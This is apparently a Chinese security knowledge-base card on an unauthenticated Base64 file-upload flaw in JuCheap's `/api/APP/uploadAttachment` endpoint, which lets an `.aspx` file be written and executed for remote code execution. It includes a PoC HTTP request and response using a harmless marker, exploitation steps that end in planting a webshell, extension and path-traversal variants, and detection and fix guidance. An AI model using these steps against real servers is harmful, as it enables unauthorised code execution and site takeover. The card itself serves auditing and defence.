---
id: web-generic-file-upload-jucheap-app-uploadattachment-base64-aspx
title: JuCheap APPController uploadAttachment 未授权 Base64 上传任意后缀：FileFormat 写 aspx 直接 getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: dotnet-webapi-allowanonymous-base64-upload-extension-aspx
tags:
- web
- dotnet
- aspnet
- webapi
- file-upload
- unrestricted-upload
- base64
- webshell
- rce
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V238
  verified_at: '2026-11-07T09:25:52+08:00'
  notes: 已对照原文与图 5-15 核对：APPController 类级 AllowAnonymous/AllowCrossSiteJson，uploadAttachment 无 token+Authorize；uploadFileTemp 用 Base64 FileStr + 客户端 FileFormat 拼接文件名写 UpLoad\EventPic，无后缀白名单；实测 POST /api/APP/uploadAttachment {FileStr:aGVsbG8xMTE=,FileFormat:aspx} 返回 path 并 GET 输出 hello111。卡内已注明原文代码写 EventPic 而实测截图为 /UpLoad/Temp 的部署差异。dup-scan 与 VideoUpLoad likely_duplicate 裁决：端点/请求格式/落盘目录/大小限制均不同，保留两张。
url: /docs/web/generic/file-upload/web-generic-file-upload-jucheap-app-uploadattachment-base64-aspx/
draft: false
kb_aliases:
- JuCheap uploadAttachment
- /api/APP/uploadAttachment
- FileStr FileFormat 上传
- 未授权 Base64 文件上传
- ASP.NET Web API 任意后缀上传
---

## 一句话结论

JuCheap 系统的 `APPController : ApiController`（类级标注 `[AllowAnonymous]`）中，`POST /api/APP/uploadAttachment` 接收 JSON 的 `FileStr`（Base64 文件内容）与 `FileFormat`（扩展名），服务层 `uploadFileTemp` 只做 `Convert.FromBase64String` 后按 `时间戳+随机数.扩展名` 原样写入站点 `UpLoad` 目录并把访问路径返回给请求者；`FileFormat` 完全由客户端控制，上传 `aspx` 后访问返回的 URL 即被 IIS 编译执行，未授权前台文件上传直接变成 RCE（原文实测页面输出 hello111）。

## 原理

- 入口：`APPController` 继承 `System.Web.Http.ApiController`，类上有 `[System.Web.Http.AllowAnonymous]` 与 `[AllowCrossSiteJson]`；按 API 控制器路由规则，动作完整路径带 `/api` 前缀，即 `/api/APP/uploadAttachment`。
- 该控制器多数动作自行读 `Request.Headers.Get("token")` 并调用 `APPService.Authorize(token)`，鉴权失败直接返回错误串；但 `uploadAttachment(EventyHandleSaveFilter filter)` 没有这段 token+Authorize 校验，直接 `new APPService().uploadAttachment(filter)`，因此在匿名可达的控制器上形成未授权上传。
- 服务层：`uploadAttachment` 取 `filter.FileStr`、`filter.FileFormat`，调用 `new EventApi().uploadFileTemp(fileStr, fileFormat)`；参数名不同（EventHandleSaveFilter/EventyHandleSaveFilter），最终都是攻击者可控的 Base64 内容和扩展名。
- 落盘：`uploadFileTemp(string fileByteStr, string fileformat)` 执行：
  - `text = Path.Combine(HttpRuntime.AppDomainAppPath, "UpLoad\\EventPic")`，目录不存在则创建；
  - `text2 = DateTime.Now.ToString("yyyyMMddHHmmss") + random.Next(1000, 9999)`；
  - `path = text + "\\" + text2 + "." + fileformat`；
  - `array = Convert.FromBase64String(fileByteStr)`，`new FileStream(path, FileMode.Create, FileAccess.Write)` 原样写入；
  - 返回 `filePaht = "/UpLoad/EventPic/" + text2 + "." + fileformat`。
- 成立的关键：扩展名只是字符串拼接，没有白名单、没有 Content-Type/魔数校验、没有把上传目录移出 Web 根，也没有禁止脚本执行；`fileformat=aspx` 时文件名形如 `202509081742181712.aspx`，IIS 默认把该目录下的 `.aspx` 交给 ASP.NET 编译执行。
- 文件名主体是时间戳+4 位随机数，可由响应中的 `data.path` 直接拿到；即使不精确枚举，接口也会回显路径。
- 原文引用的 `uploadFileTemp` 落盘目录是 `UpLoad\EventPic`，但实测截图返回并访问的是 `/UpLoad/Temp/202509081742181712.aspx`（访问后输出 hello111），说明部署版本实际走到了同族的 `uploadFile`/`UpLoad\Temp` 分支；两处共同点都是“扩展名来自客户端、Base64 内容原样落盘、返回 Web 路径”，不影响利用链。

## 触发条件

- 目标为使用 JuCheap.Web / JuCheap.Services 代码的 .NET 应用，`/api/APP/uploadAttachment` 路由可达。
- 控制器上的 `AllowAnonymous` 生效，且该动作没有额外 token 校验（原文代码即如此）。
- 应用池账户对站点 `UpLoad`（EventPic 或 Temp）目录有写权限；代码会自动创建目录。
- IIS 允许该目录中的 `.aspx`（以及 `.ashx`、`.asmx`、`.config` 等）被解析/生效；若上传目录被配置为禁止脚本执行，则退化为任意文件写入。

## 利用步骤

1. 确认 `POST /api/APP/uploadAttachment` 匿名可达：发送合法 JSON 但空的 `FileStr`，观察是否返回业务错误而不是鉴权错误。
2. 将最小 ASPX 内容做 Base64（原文用 `hello111` 得到 `aGVsbG8xMTE=`），`FileFormat` 填 `aspx`，发送 JSON。
3. 从响应 `data.path` 取回访问路径（形如 `/UpLoad/Temp/<时间戳+随机>.aspx` 或 `/UpLoad/EventPic/<...>.aspx`）。
4. 浏览器/HTTP GET 该路径，确认 ASPX 被解析执行（原文返回 hello111）。
5. 将内容替换为命令执行/文件管理/内存马等 webshell，获得 w3wp 进程权限；也可用 `.ashx`/`.asmx` 等扩展测试 IIS 处理程序映射。

## PoC

原文实测请求与响应：

```http
POST /api/APP/uploadAttachment HTTP/1.1
Host: <target>
Content-Type: application/json
Accept: */*
Connection: close
Content-Length: 46

{"FileStr":"aGVsbG8xMTE=","FileFormat":"aspx"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET

{"status":200,"msg":"成功","data":{"id":"...","path":"/UpLoad/Temp/202509081742181712.aspx"}}
```

```text
GET /UpLoad/Temp/202509081742181712.aspx
页面输出：hello111
```

说明：`aGVsbG8xMTE=` 是 `hello111` 的 Base64；原文只验证文本输出，未上传真实 webshell，验证时请使用无害标记页。

## 变体与关联

- 变体（扩展名）：`.aspx`、`.ashx`、`.asmx`、`.svc`、`.config`、`.asax`，取决于目标 IIS 的处理程序映射与请求过滤；`.config` 还可能改写处理程序。
- 变体（参数）：`fileFormat` 可带额外点或大小写（`ASPX`、`aspx.`），观察 IIS 与代码拼接后的实际文件名；`fileFormat` 中若含 `\`/`..` 还可能影响落盘目录（需在授权范围内验证）。
- 变体（入口）：同控制器/同服务层中还有 `uploadFile`、`uploadVideoTemp` 等兄弟上传函数，参数形态不同但同样缺少后缀白名单，见关联卡。
- 关联：[[web-generic-file-upload-jucheap-newsmanage-uploadnewsimg-aspx]]（同系统 MVC `[IgnoreRightFilter]` 匿名上传 `UpLoad\News`）、[[web-generic-file-upload-jucheap-app-videoupload-original-extension]]（同控制器 `VideoUpLoad` 原始文件名上传）。
- 同类：[[web-generic-file-upload-dotnet-uploadpicture-aspx-webshell]]、[[web-generic-file-upload-jiuyin-common-uploadtemppicture-aspx]]、[[web-generic-file-upload-extension-zero-check]]。
- 边界：上传目录禁止脚本执行、站点请求过滤拒绝脚本扩展、接口补上 token+Authorize 或后缀白名单时链路失效。

## 检测与防御

- 请求检测：`/api/APP/uploadAttachment` 的 JSON 中 `FileFormat` 为 `aspx`/`ashx`/`asmx`/`config`/`svc` 等可执行扩展；`FileStr` 为长 Base64 且解码后含 `<%@`、`<%`、`eval(`、`ProcessStartInfo` 等特征；同一来源高频调用上传接口。
- 主机检测：`UpLoad\EventPic`、`UpLoad\Temp` 等目录新增脚本文件；w3wp 进程写入 `.aspx`；IIS 日志中对上传目录下 `.aspx` 的首访与编译错误；上传目录出现 webshell 特征。
- 修复：上传接口统一接入鉴权；扩展名使用服务端映射白名单（只允许图片/文档），不要直接拼接客户端 `FileFormat`；校验 Content-Type 与文件魔数；服务端重命名为 UUID + 固定安全后缀；上传目录移出 Web 根或配置为禁止脚本执行（IIS requestFiltering / 单独站点无执行权限）。
- 加固：API 控制器不要用类级 `AllowAnonymous` 覆盖全部动作，敏感动作单独 `[Authorize]`；对 `FileStr` 做大小限制与格式校验；WAF 拦截脚本后缀与 Base64 编码的 webshell 特征；定期扫描上传目录中的可执行文件。
